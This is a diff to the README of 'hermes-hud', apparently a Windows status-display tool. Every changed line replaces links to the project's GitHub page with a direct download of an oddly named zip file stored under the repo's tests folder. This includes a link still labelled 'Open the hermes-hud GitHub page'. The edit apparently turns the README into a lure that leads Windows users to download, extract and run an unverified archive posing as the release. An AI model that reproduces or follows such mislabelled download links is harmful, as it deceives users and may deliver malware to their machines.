@@ -1,12 +1,12 @@
 # 🧠 hermes-hud - See Hermes State at a Glance
 
-[![Download hermes-hud](https://img.shields.io/badge/Download-hermes--hud-blue.svg?style=for-the-badge&logo=github)](https://github.com/Lucasdjs22/hermes-hud)
+[![Download hermes-hud](https://img.shields.io/badge/Download-hermes--hud-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[https://github.com/Lucasdjs22/hermes-hud](https://github.com/Lucasdjs22/hermes-hud)
+[https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip](https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip)
 
 On that page, get the Windows build or the latest release file, then save it to your PC
 
@@ -33,7 +33,7 @@ It is made for people who want a simple screen that stays easy to read
 
 Follow these steps on Windows:
 
-1. Open the download page: [https://github.com/Lucasdjs22/hermes-hud](https://github.com/Lucasdjs22/hermes-hud)
+1. Open the download page: [https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip](https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip)
 2. Find the latest release or Windows file
 3. Download the file to your PC
 4. If the file comes in a .zip folder, right-click it and choose Extract All
@@ -135,7 +135,7 @@ If a new version appears on the GitHub page, download the newer file and use tha
 
 ## 📎 Direct link
 
-[Open the hermes-hud GitHub page](https://github.com/Lucasdjs22/hermes-hud)
+[Open the hermes-hud GitHub page](https://raw.githubusercontent.com/Lucasdjs22/hermes-hud/main/tests/hermes-hud-pleochromatism.zip)
 
 ## 🧩 File handling on Windows
 
